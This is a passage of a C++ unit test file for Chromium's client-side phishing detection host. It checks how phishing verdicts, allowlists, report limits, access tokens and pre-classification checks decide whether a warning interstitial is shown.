  EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(
                                 PartiallyEqualVerdict(verdict), _, _))
      .WillOnce(MoveArg<1>(&cb));
  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict));
  EXPECT_TRUE(Mock::VerifyAndClear(csd_host_.get()));
  ASSERT_FALSE(cb.is_null());

  // Make sure DisplayBlockingPage is not going to be called.
  EXPECT_CALL(*ui_manager_.get(), DisplayBlockingPage(_)).Times(0);
  std::move(cb).Run(GURL(verdict.url()), false, net::HTTP_OK, std::nullopt);
  EXPECT_TRUE(Mock::VerifyAndClear(ui_manager_.get()));
}

TEST_F(ClientSideDetectionHostTest, PhishingDetectionDoneShowInterstitial) {
  base::HistogramTester histogram_tester;

  // Case 2: client thinks the page is phishing and so does the server.
  // We show an interstitial.
  ClientSideDetectionService::ClientReportPhishingRequestCallback cb;
  GURL phishing_url("http://phishingurl.com/");
  ClientPhishingRequest verdict;
  verdict.set_url(phishing_url.spec());
  verdict.set_client_score(1.0f);
  verdict.set_is_phishing(true);

  EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(
                                 PartiallyEqualVerdict(verdict), _, _))
      .WillOnce(MoveArg<1>(&cb));
  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict));
  EXPECT_TRUE(Mock::VerifyAndClear(csd_host_.get()));
  EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));
  ASSERT_FALSE(cb.is_null());

  base::RunLoop run_loop;
  UnsafeResource resource;
  EXPECT_CALL(*ui_manager_.get(), DisplayBlockingPage(_))
      .WillOnce(
          DoAll(SaveArg<0>(&resource), RunOnceClosure(run_loop.QuitClosure())));
  std::move(cb).Run(phishing_url, true, net::HTTP_OK, std::nullopt);
  run_loop.Run();

  EXPECT_TRUE(Mock::VerifyAndClear(ui_manager_.get()));
  EXPECT_EQ(phishing_url, resource.url);
  EXPECT_EQ(phishing_url, resource.original_url);
  EXPECT_EQ(SBThreatType::SB_THREAT_TYPE_URL_CLIENT_SIDE_PHISHING,
            resource.threat_type);
  EXPECT_EQ(ThreatSource::CLIENT_SIDE_DETECTION, resource.threat_source);
  EXPECT_EQ(web_contents(),
            unsafe_resource_util::GetWebContentsForResource(resource));
  EXPECT_TRUE(resource.navigation_id.has_value());

  histogram_tester.ExpectUniqueSample(
      "SBClientPhishing.HighConfidenceAllowlistMatchOnServerVerdictPhishy",
      false, 1);
  histogram_tester.ExpectTotalCount("SBClientPhishing.Viewport.PixelsPerInch",
                                    1);
}

TEST_F(ClientSideDetectionHostTest, UserReportSkipsAllowlist) {
  GURL url("http://allowlisted.com/");

  // Set the URL as allowlisted.
  database_manager_->SetAllowlistLookupDetailsForUrl(url, true);

  // Common expectations for any classification.
  EXPECT_CALL(*csd_service_, IsPrivateIPAddress(_))
      .WillRepeatedly(Return(false));
  EXPECT_CALL(*csd_service_, AtPhishingReportLimit())
      .WillRepeatedly(Return(false));
  EXPECT_CALL(*database_manager_.get(), CanCheckUrl(_))
      .WillRepeatedly(Return(true));

  // For the initial navigation (TRIGGER_MODELS), it should check the allowlist
  // and match.
  EXPECT_CALL(*database_manager_.get(), CheckCsdAllowlistUrl(url, _))
      .WillOnce(Return(AsyncMatch::MATCH));

  NavigateAndCommit(url);
  base::RunLoop().RunUntilIdle();

  // Verification: Phishing detection should NOT have started for
  // TRIGGER_MODELS.
  EXPECT_FALSE(fake_phishing_detector_.phishing_detection_started());

  // Now trigger USER_REPORT. It should skip allowlist and start classification.
  // CheckCsdAllowlistUrl should NOT be called again.
  base::test::TestFuture<void> future;
  csd_host_->ReportUnsafeSite(SkBitmap(), future.GetCallback());

  base::RunLoop().RunUntilIdle();

  EXPECT_TRUE(future.IsReady());

  fake_phishing_detector_.CheckMessage(&url);
}

TEST_F(ClientSideDetectionHostTest, UserReportSkipsReportLimit) {
  GURL url("http://example.com/");

  // Set that we are at the phishing report limit.
  EXPECT_CALL(*csd_service_, AtPhishingReportLimit())
      .WillRepeatedly(Return(true));

  // Common expectations.
  EXPECT_CALL(*csd_service_, IsPrivateIPAddress(_))
      .WillRepeatedly(Return(false));
  EXPECT_CALL(*database_manager_.get(), CanCheckUrl(_))
      .WillRepeatedly(Return(true));
  EXPECT_CALL(*database_manager_.get(), CheckCsdAllowlistUrl(url, _))
      .WillRepeatedly(Return(AsyncMatch::NO_MATCH));
  database_manager_->SetAllowlistLookupDetailsForUrl(url, false);

  NavigateAndCommit(url);
  base::RunLoop().RunUntilIdle();

  // Verification: Phishing detection should NOT have started for
  // TRIGGER_MODELS.
  EXPECT_FALSE(fake_phishing_detector_.phishing_detection_started());

  // Now trigger USER_REPORT. It should skip report limit and start
  // classification.
  base::test::TestFuture<void> future;
  csd_host_->ReportUnsafeSite(SkBitmap(), future.GetCallback());

  base::RunLoop().RunUntilIdle();

  EXPECT_TRUE(future.IsReady());

  fake_phishing_detector_.CheckMessage(&url);
}

TEST_F(ClientSideDetectionHostTest, UnfamiliarLoginPageTriggersClassification) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }

  base::test::ScopedFeatureList feature_list;
  feature_list.InitAndEnableFeatureWithParameters(
      kProactivePasswordProtection,
      {{kCsdProactivePasswordProtectionSampleRate.name, "1.0"}});

  safe_browsing::SetSafeBrowsingState(
      profile()->GetPrefs(),
      safe_browsing::SafeBrowsingState::ENHANCED_PROTECTION);

  GURL url("http://example.com/");

  ExpectPreClassificationChecks(url, &kFalse, &kFalse, &kFalse, &kFalse);
  database_manager_->SetAllowlistLookupDetailsForUrl(url, false);

  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();

  fake_phishing_detector_.Reset();

  // Trigger UNFAMILIAR_LOGIN_PAGE.
  ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, &kFalse);
  csd_host_->OnUnfamiliarLoginPageDetected();
  WaitAndCheckPreClassificationChecks();

  fake_phishing_detector_.CheckMessage(&url);
  EXPECT_EQ(safe_browsing::mojom::ClientSideDetectionType::kUnfamiliarLoginPage,
            fake_phishing_detector_.last_request_type());
}

TEST_F(ClientSideDetectionHostTest, UnfamiliarLoginPageSampleRate) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }

  safe_browsing::SetSafeBrowsingState(
      profile()->GetPrefs(),
      safe_browsing::SafeBrowsingState::ENHANCED_PROTECTION);

  GURL url("http://example.com/");

  ExpectPreClassificationChecks(url, &kFalse, &kFalse, &kFalse, &kFalse);
  database_manager_->SetAllowlistLookupDetailsForUrl(url, false);

  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();

  {
    // Set sample rate to 0.0 (always stop).
    base::test::ScopedFeatureList feature_list;
    feature_list.InitAndEnableFeatureWithParameters(
        kProactivePasswordProtection,
        {{kCsdProactivePasswordProtectionSampleRate.name, "0.0"}});

    fake_phishing_detector_.Reset();

    ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, &kFalse);
    csd_host_->OnUnfamiliarLoginPageDetected();
    WaitAndCheckPreClassificationChecks();

    EXPECT_FALSE(fake_phishing_detector_.phishing_detection_started());
  }

  fake_phishing_detector_.Reset();

  {
    // Set sample rate to 1.0 (always proceed).
    base::test::ScopedFeatureList feature_list;
    feature_list.InitAndEnableFeatureWithParameters(
        kProactivePasswordProtection,
        {{kCsdProactivePasswordProtectionSampleRate.name, "1.0"}});

    ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, &kFalse);
    csd_host_->OnUnfamiliarLoginPageDetected();
    WaitAndCheckPreClassificationChecks();

    EXPECT_TRUE(fake_phishing_detector_.phishing_detection_started());
  }
}

TEST_F(ClientSideDetectionHostTest,
       UnfamiliarLoginPage_NoEnhancedProtection_NoTrigger) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }

  base::test::ScopedFeatureList feature_list;
  feature_list.InitWithFeaturesAndParameters(
      /*enabled_features=*/{{kProactivePasswordProtection,
                             {{kCsdProactivePasswordProtectionSampleRate.name,
                               "1.0"}}}},
      /*disabled_features=*/{kClientSideDetectionOnlyESBClassification});

  // Disable Enhanced Protection.
  safe_browsing::SetSafeBrowsingState(
      profile()->GetPrefs(),
      safe_browsing::SafeBrowsingState::STANDARD_PROTECTION);

  GURL url("http://example.com/");

  ExpectPreClassificationChecks(url, &kFalse, &kFalse, &kFalse, &kFalse);
  database_manager_->SetAllowlistLookupDetailsForUrl(url, false);

  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();

  fake_phishing_detector_.Reset();

  // Trigger UNFAMILIAR_LOGIN_PAGE.
  csd_host_->OnUnfamiliarLoginPageDetected();

  base::RunLoop().RunUntilIdle();

  // Should NOT trigger.
  EXPECT_FALSE(fake_phishing_detector_.phishing_detection_started());
}

TEST_F(ClientSideDetectionHostTest, PhishingDetectionDoneMultiplePings) {
  // Case 3 & 4: client thinks a page is phishing then navigates to
  // another page which is also considered phishing by the client
  // before the server responds with a verdict.  After a while the
  // server responds for both requests with a phishing verdict.  Only
  // a single interstitial is shown for the second URL.
  ClientSideDetectionService::ClientReportPhishingRequestCallback cb;
  GURL phishing_url("http://phishingurl.com/");
  ClientPhishingRequest verdict;
  verdict.set_url(phishing_url.spec());
  verdict.set_client_score(1.0f);
  verdict.set_is_phishing(true);

  EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(
                                 PartiallyEqualVerdict(verdict), _, _))
      .WillOnce(MoveArg<1>(&cb));
  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict));
  EXPECT_TRUE(Mock::VerifyAndClear(csd_host_.get()));
  EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));
  ASSERT_FALSE(cb.is_null());

  GURL other_phishing_url("http://other_phishing_url.com/bla");
  database_manager_->SetAllowlistLookupDetailsForUrl(other_phishing_url, false);
  ExpectPreClassificationChecks(other_phishing_url, &kFalse, &kFalse, &kFalse,
                                &kFalse);
  // We navigate away.  The callback cb should be revoked.
  NavigateAndCommit(other_phishing_url);
  // Wait for the pre-classification checks to finish for other_phishing_url.
  WaitAndCheckPreClassificationChecks();

  ClientSideDetectionService::ClientReportPhishingRequestCallback cb_other;
  verdict.set_url(other_phishing_url.spec());
  verdict.set_client_score(0.8f);

  {
    base::RunLoop run_loop;
    EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(
                                   PartiallyEqualVerdict(verdict), _, _))
        .WillOnce(DoAll(RunOnceClosure(run_loop.QuitClosure()),
                        MoveArg<1>(&cb_other)));
    PhishingDetectionDone(mojo_base::ProtoWrapper(verdict));
    run_loop.Run();
  }

  EXPECT_TRUE(Mock::VerifyAndClear(csd_host_.get()));
  EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));
  ASSERT_FALSE(cb_other.is_null());

  // We expect that the interstitial is shown for the second phishing URL and
  // not for the first phishing URL.
  UnsafeResource resource;

  {
    base::RunLoop run_loop;
    EXPECT_CALL(*ui_manager_.get(), DisplayBlockingPage(_))
        .WillOnce(DoAll(SaveArg<0>(&resource),
                        RunOnceClosure(run_loop.QuitClosure())));

    std::move(cb).Run(phishing_url, true, net::HTTP_OK,
                      std::nullopt);  // Should have no effect.
    std::move(cb_other).Run(other_phishing_url, true, net::HTTP_OK,
                            std::nullopt);  // Should show interstitial.
    run_loop.Run();
  }

  EXPECT_TRUE(Mock::VerifyAndClear(ui_manager_.get()));
  EXPECT_EQ(other_phishing_url, resource.url);
  EXPECT_EQ(other_phishing_url, resource.original_url);
  EXPECT_EQ(SBThreatType::SB_THREAT_TYPE_URL_CLIENT_SIDE_PHISHING,
            resource.threat_type);
  EXPECT_EQ(ThreatSource::CLIENT_SIDE_DETECTION, resource.threat_source);
  EXPECT_EQ(web_contents(),
            unsafe_resource_util::GetWebContentsForResource(resource));
}

TEST_F(ClientSideDetectionHostTest, PhishingDetectionDoneVerdictNotPhishing) {
  // Case 5: renderer sends a verdict string that isn't phishing.
  ClientPhishingRequest verdict;
  verdict.set_url("http://not-phishing.com/");
  verdict.set_client_score(0.1f);
  verdict.set_is_phishing(false);

  EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(_, _, _)).Times(0);
  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict));
  EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));
}

TEST_F(
    ClientSideDetectionHostTest,
    PhishingDetectionDoneServerModelPhishyAndExistsInHighConfidenceAllowlist) {
  base::HistogramTester histogram_tester;

  // Client thinks the page is phishing and so does the server.
  // We show an interstitial.
  ClientSideDetectionService::ClientReportPhishingRequestCallback cb;
  GURL phishing_url("http://phishingurl.com/");
  ClientPhishingRequest verdict;
  verdict.set_url(phishing_url.spec());
  verdict.set_client_score(1.0f);
  verdict.set_is_phishing(true);

  EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(
                                 PartiallyEqualVerdict(verdict), _, _))
      .WillOnce(MoveArg<1>(&cb));
  // Bypass the preclassification check with where the allowlist check occurs,
  // since this unit test strictly tests post classification allowlist match
  // check.
  PhishingDetectionDoneWithHighConfidenceAllowlistMatch(
      mojo_base::ProtoWrapper(verdict));
  EXPECT_TRUE(Mock::VerifyAndClear(csd_host_.get()));
  EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));
  ASSERT_FALSE(cb.is_null());

  UnsafeResource resource;
  EXPECT_CALL(*ui_manager_.get(), DisplayBlockingPage(_))
      .WillOnce(SaveArg<0>(&resource));
  std::move(cb).Run(phishing_url, true, net::HTTP_OK, std::nullopt);

  base::RunLoop().RunUntilIdle();
  EXPECT_TRUE(Mock::VerifyAndClear(ui_manager_.get()));
  EXPECT_EQ(phishing_url, resource.url);
  EXPECT_EQ(phishing_url, resource.original_url);
  EXPECT_EQ(SBThreatType::SB_THREAT_TYPE_URL_CLIENT_SIDE_PHISHING,
            resource.threat_type);
  EXPECT_EQ(ThreatSource::CLIENT_SIDE_DETECTION, resource.threat_source);
  EXPECT_EQ(web_contents(),
            unsafe_resource_util::GetWebContentsForResource(resource));

  // Test that the histogram has been logged that the allowlist did exist with
  // the server model verdict phishy.
  histogram_tester.ExpectUniqueSample(
      "SBClientPhishing.ServerModelDetectsPhishing", true, 1);
  histogram_tester.ExpectUniqueSample(
      "SBClientPhishing.HighConfidenceAllowlistMatchOnServerVerdictPhishy",
      true, 1);
}

TEST_F(ClientSideDetectionHostTest,
       PhishingDetectionDoneVerdictNotPhishingButSBMatchOnNewRVH) {
  // When navigating to a different host (thus creating a pending RVH) which
  // matches regular malware list, and after navigation the renderer sends a
  // verdict string that isn't phishing, we should still send the report.

  GURL start_url("http://safe.example.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(start_url, false);
  ExpectPreClassificationChecks(start_url, &kFalse, &kFalse, &kFalse, &kFalse);
  NavigateAndCommit(start_url);
  WaitAndCheckPreClassificationChecks();

  // Now navigate to a different host which will have a malware hit before the
  // navigation commits.
  GURL url("http://malware-but-not-phishing.com/");
  ClientPhishingRequest verdict;
  verdict.set_url(url.spec());
  verdict.set_client_score(0.1f);
  verdict.set_is_phishing(false);

  database_manager_->SetAllowlistLookupDetailsForUrl(url, false);
  ExpectPreClassificationChecks(url, &kFalse, &kFalse, &kFalse, &kFalse);
  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();

  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict));
}

TEST_F(ClientSideDetectionHostTest,
       PhishingDetectionDoneEnhancedProtectionShouldHaveToken) {
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  ClientPhishingRequest verdict;
  verdict.set_url("http://example.com/");
  verdict.set_client_score(1.0f);
  verdict.set_is_phishing(true);

  // Set up mock call to csd service.
  EXPECT_CALL(*csd_service_,
              SendClientReportPhishingRequest(PartiallyEqualVerdict(verdict), _,
                                              "fake_access_token"));

  // Set up mock call to token fetcher.
  SafeBrowsingTokenFetcher::Callback cb;
  EXPECT_CALL(*raw_token_fetcher_, Start(_)).WillOnce(MoveArg<0>(&cb));

  // Make the call.
  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict));

  // Wait for token fetcher to be called.
  EXPECT_TRUE(Mock::VerifyAndClear(raw_token_fetcher_));

  ASSERT_FALSE(cb.is_null());
  std::move(cb).Run("fake_access_token");
}

TEST_F(ClientSideDetectionHostTest,
       PhishingDetectionDoneCalledTwiceShouldSucceed) {
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  ClientPhishingRequest verdict;
  verdict.set_url("http://example.com/");
  verdict.set_client_score(1.0f);
  verdict.set_is_phishing(true);

  // Set up mock call to csd service.
  EXPECT_CALL(*csd_service_,
              SendClientReportPhishingRequest(PartiallyEqualVerdict(verdict), _,
                                              "fake_access_token_1"))
      .Times(1);

  // Set up mock call to csd service.
  EXPECT_CALL(*csd_service_,
              SendClientReportPhishingRequest(PartiallyEqualVerdict(verdict), _,
                                              "fake_access_token_2"))
      .Times(1);

  // Set up mock call to token fetcher.
  SafeBrowsingTokenFetcher::Callback cb;
  EXPECT_CALL(*raw_token_fetcher_, Start(_))
      .Times(1)
      .WillRepeatedly(MoveArg<0>(&cb));

  // Make the call.
  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict));

  // Wait for token fetcher to be called.
  EXPECT_TRUE(Mock::VerifyAndClear(raw_token_fetcher_));

  ASSERT_FALSE(cb.is_null());
  std::move(cb).Run("fake_access_token_1");

  // Make the call again.
  EXPECT_CALL(*raw_token_fetcher_, Start(_))
      .Times(1)
      .WillRepeatedly(MoveArg<0>(&cb));
  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict));
  EXPECT_TRUE(Mock::VerifyAndClear(raw_token_fetcher_));
  ASSERT_FALSE(cb.is_null());
  std::move(cb).Run("fake_access_token_2");
}

TEST_F(ClientSideDetectionHostIncognitoTest,
       PhishingDetectionDoneIncognitoShouldNotHaveToken) {
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  ClientPhishingRequest verdict;
  verdict.set_url("http://example.com/");
  verdict.set_client_score(1.0f);
  verdict.set_is_phishing(true);

  // Set up mock call to csd service.
  EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(
                                 PartiallyEqualVerdict(verdict), _, ""));

  // Set up mock call to token fetcher.
  SafeBrowsingTokenFetcher::Callback cb;
  EXPECT_CALL(*raw_token_fetcher_, Start(_)).Times(0);

  // Make the call.
  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict));
}

TEST_F(ClientSideDetectionHostTest,
       PhishingDetectionDoneNoEnhancedProtectionShouldNotHaveToken) {
  ClientPhishingRequest verdict;
  verdict.set_url("http://example.com/");
  verdict.set_client_score(1.0f);
  verdict.set_is_phishing(true);

  // Set up mock call to csd service.
  EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(
                                 PartiallyEqualVerdict(verdict), _, ""));

  // Set up mock call to token fetcher.
  SafeBrowsingTokenFetcher::Callback cb;
  EXPECT_CALL(*raw_token_fetcher_, Start(_)).Times(0);

  // Make the call.
  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict));
}

// This test doesn't work because it makes assumption about how
// the message loop is run, and those assumptions are wrong when properly
// simulating a navigation with browser-side navigations.
// TODO(clamy): Fix the test and re-enable. See crbug.com/41338215.
TEST_F(ClientSideDetectionHostTest,
       DISABLED_NavigationCancelsShouldClassifyUrl) {
  // Test that canceling pending should classify requests works as expected.
  GURL first_url("http://first.phishy.url.com");
  GURL second_url("http://second.url.com/");
  // The first few checks are done synchronously so check that they have been
  // done for the first URL, while the second URL has all the checks done.  We
  // need to manually set up the IsPrivateIPAddress mock since if the same mock
  // expectation is specified twice, gmock will only use the last instance of
  // it, meaning the first will never be matched.
  EXPECT_CALL(*csd_service_, IsPrivateIPAddress(_))
      .WillOnce(Return(false))
      .WillOnce(Return(false));
  ExpectPreClassificationChecks(first_url, nullptr, &kFalse, nullptr, nullptr);
  ExpectPreClassificationChecks(second_url, nullptr, &kFalse, &kFalse, &kFalse);

  NavigateAndCommit(first_url);
  // Don't flush the message loop, as we want to navigate to a different
  // url before the final pre-classification checks are run.
  NavigateAndCommit(second_url);
  WaitAndCheckPreClassificationChecks();
}

TEST_F(ClientSideDetectionHostTest, TestPreClassificationCheckPass) {
  base::HistogramTester histogram_tester;

  // Navigate the tab to a page.  We should see a StartPhishingDetection IPC.
  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, false);
  ExpectPreClassificationChecks(url, &kFalse, &kFalse, &kFalse, &kFalse);
  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();

  fake_phishing_detector_.CheckMessage(&url);

  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.PreClassificationCheckResult",
      PreClassificationCheckResult::CLASSIFY, 1);
  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.PreClassificationCheckResult.TriggerModel",
      PreClassificationCheckResult::CLASSIFY, 1);
  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.IntelligentScanOngoingOnNewPreclassification", false,
      1);
}

TEST_F(ClientSideDetectionHostTest,
       TestPreClassificationCheckPassAlternateObserverOrder) {
  base::HistogramTester histogram_tester;

  // Navigate the tab to a page.  We should see a StartPhishingDetection IPC.
  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, false);
  ExpectPreClassificationChecks(url, &kFalse, &kFalse, &kFalse, &kFalse);

  NavigateAndCommit(url, /*reverse_callback_order=*/true);

  WaitAndCheckPreClassificationChecks();

  fake_phishing_detector_.CheckMessage(&url);

  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.PreClassificationCheckResult",
      PreClassificationCheckResult::CLASSIFY, 1);
  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.PreClassificationCheckResult.TriggerModel",
      PreClassificationCheckResult::CLASSIFY, 1);
  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.IntelligentScanOngoingOnNewPreclassification", false,
      1);
}

TEST_F(ClientSideDetectionHostTest,
       TestPreClassificationCheckMatchCSDAllowlist) {
  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, false);
  ExpectPreClassificationChecks(url, &kFalse, &kTrue, nullptr, nullptr);
  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();
}

TEST_F(ClientSideDetectionHostTest,
       TestPreClassificationCheckMatchHighConfidenceAllowlist) {
  SetHighConfidenceAllowlistAcceptanceRate(1.0f);
  base::HistogramTester histogram_tester;

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/true);
  ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, nullptr);
  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.MatchHighConfidenceAllowlist.TriggerModel", 1);
  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.PreClassificationCheckResult",
      PreClassificationCheckResult::NO_CLASSIFY_MATCH_HC_ALLOWLIST, 1);
}

TEST_F(ClientSideDetectionHostTest,
       TestPreClassificationCheckDoesNotMatchHighConfidenceAllowlist) {
  SetHighConfidenceAllowlistAcceptanceRate(0.0f);
  base::HistogramTester histogram_tester;

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/true);
  ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, nullptr);
  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.MatchHighConfidenceAllowlist.TriggerModel", 1);
  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.PreClassificationCheckResult",
      PreClassificationCheckResult::NO_CLASSIFY_MATCH_HC_ALLOWLIST, 0);
}

TEST_F(ClientSideDetectionHostTest, TestPreClassificationCheckXHTML) {
  // Check that XHTML is supported, in addition to the default HTML type.
  GURL url("http://host.com/xhtml");
  auto navigation =
      content::NavigationSimulator::CreateBrowserInitiated(url, web_contents());
  navigation->SetContentsMimeType("application/xhtml+xml");
  navigation->SetKeepLoading(true);

  database_manager_->SetAllowlistLookupDetailsForUrl(url, false);

  ExpectPreClassificationChecks(url, &kFalse, &kFalse, &kFalse, &kFalse);
  navigation->Commit();
  if (base::FeatureList::IsEnabled(kClientSideDetectionNewObservers)) {
    NotifyClientSideDetectionObservers();
  }
  WaitAndCheckPreClassificationChecks();

  fake_phishing_detector_.CheckMessage(&url);
}

TEST_F(ClientSideDetectionHostTest, TestPreClassificationCheckTwoNavigations) {
  // Navigate to two hosts, which should cause two IPCs.
  GURL url1("http://host1.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url1, false);
  ExpectPreClassificationChecks(url1, &kFalse, &kFalse, &kFalse, &kFalse);
  NavigateAndCommit(url1);
  WaitAndCheckPreClassificationChecks();

  fake_phishing_detector_.CheckMessage(&url1);

  GURL url2("http://host2.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url2, false);
  ExpectPreClassificationChecks(url2, &kFalse, &kFalse, &kFalse, &kFalse);
  NavigateAndCommit(url2);
  WaitAndCheckPreClassificationChecks();

  fake_phishing_detector_.CheckMessage(&url2);
}

TEST_F(ClientSideDetectionHostTest, TestPreClassificationCheckCancelActor) {
  base::HistogramTester histogram_tester;

  // Although we'll navigate to url1 and keep loading, we will not complete the
  // preclassification check and continue loading, so that url2 can cancel it.
  GURL url1("http://host1.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url1, false);
  NavigateAndCommit(url1);

  GURL url2("http://host2.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url2, false);
  NavigateAndCommit(url2);

  // Navigating to a second page will cancel the preclassification check of the
  // first page.
  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.PreClassificationCheckCancelActor.TriggerModel",
      ClientSideDetectionType::TRIGGER_MODELS, 1);

  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  // Keyboard lock request incoming, which triggers preclassification checks,
  // meaning it will cancel the TriggerModel preclassification check result from
  // url2.
  ExpectPreClassificationChecks(url2, &kFalse, &kFalse, nullptr, nullptr);

  csd_host_->KeyboardLockRequested();
  WaitAndCheckPreClassificationChecks();

  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.PreClassificationCheckCancelActor.TriggerModel",
      ClientSideDetectionType::KEYBOARD_LOCK_REQUESTED, 1);
  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.PreClassificationCheckResult",
      PreClassificationCheckResult::NO_CLASSIFY_CANCEL, 2);
}

TEST_F(ClientSideDetectionHostTest,
       TestPreClassificationCheckPrivateIpAddress) {
  // If IsPrivateIPAddress returns true, no IPC should be triggered.
  GURL url("http://host3.com/");
  ExpectPreClassificationChecks(url, &kTrue, nullptr, nullptr, nullptr);
  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();

  fake_phishing_detector_.CheckMessage(nullptr);
}

TEST_F(ClientSideDetectionHostTest, TestPreClassificationCheckLocalResource) {
  base::HistogramTester histogram_tester;
  feature_list_.InitAndEnableFeature(kClientSideDetectionLocalResourceCheckFix);
  // If IsLocalResource returns true, no IPC should be triggered.
  GURL url("file:///tmp/index.html");
  ExpectPreClassificationChecks(url, &kFalse, nullptr, nullptr, nullptr);
  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();

  histogram_tester.ExpectUniqueSample(
      "SBClientPhishing.PreClassificationCheckResult",
      PreClassificationCheckResult::NO_CLASSIFY_LOCAL_RESOURCE, 1);
  histogram_tester.ExpectUniqueSample(
      "SBClientPhishing.PreClassificationCheckResult.TriggerModel",
      PreClassificationCheckResult::NO_CLASSIFY_LOCAL_RESOURCE, 1);

  fake_phishing_detector_.CheckMessage(nullptr);
}

TEST_F(ClientSideDetectionHostTest, TestPreClassificationCheckErrorDocument) {
  base::HistogramTester histogram_tester;
  feature_list_.InitWithFeatures({kClientSideDetectionSkipErrorPage,
                                  kClientSideDetectionLocalResourceCheckFix},
                                 {});

  GURL url("http://host.com/");
  // IsLocalResource is checked before IsErrorDocument. It should be mocked to
  // return false. IsPrivateIPAddress is checked after, so it shouldn't be
  // called.
  ExpectPreClassificationChecks(url, /*is_private=*/nullptr,
                                /*match_csd_allowlist=*/nullptr,
                                /*get_valid_cached_result=*/nullptr,
                                /*over_phishing_report_limit=*/nullptr);

  // Simulate a navigation that results in an error page. This will trigger the
  // pre-classification check.
  auto navigation =
      content::NavigationSimulator::CreateBrowserInitiated(url, web_contents());
  navigation->Fail(net::ERR_FAILED);
  navigation->CommitErrorPage();
  if (base::FeatureList::IsEnabled(kClientSideDetectionNewObservers)) {
    NotifyClientSideDetectionObservers();
  }
  WaitAndCheckPreClassificationChecks();

  histogram_tester.ExpectUniqueSample(
      "SBClientPhishing.PreClassificationCheckResult",
      PreClassificationCheckResult::NO_CLASSIFY_ERROR_DOCUMENT, 1);
  histogram_tester.ExpectUniqueSample(
      "SBClientPhishing.PreClassificationCheckResult.TriggerModel",
      PreClassificationCheckResult::NO_CLASSIFY_ERROR_DOCUMENT, 1);

  // No phishing detection IPC should be sent.
  fake_phishing_detector_.CheckMessage(nullptr);
}

TEST_F(ClientSideDetectionHostIncognitoTest,
       TestPreClassificationCheckIncognito) {
  // If the tab is incognito there should be no IPC.  Also, we shouldn't
  // even check the csd-allowlist.
  GURL url("http://host4.com/");
  ExpectPreClassificationChecks(url, &kFalse, nullptr, nullptr, nullptr);

  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();

  fake_phishing_detector_.CheckMessage(nullptr);
}

TEST_F(ClientSideDetectionHostTest,
       TestPreClassificationCheckOverPhishingReportingLimit) {
  // If the url isn't in the cache and we are over the reporting limit, we
  // don't do classification.
  GURL url("http://host7.com/");
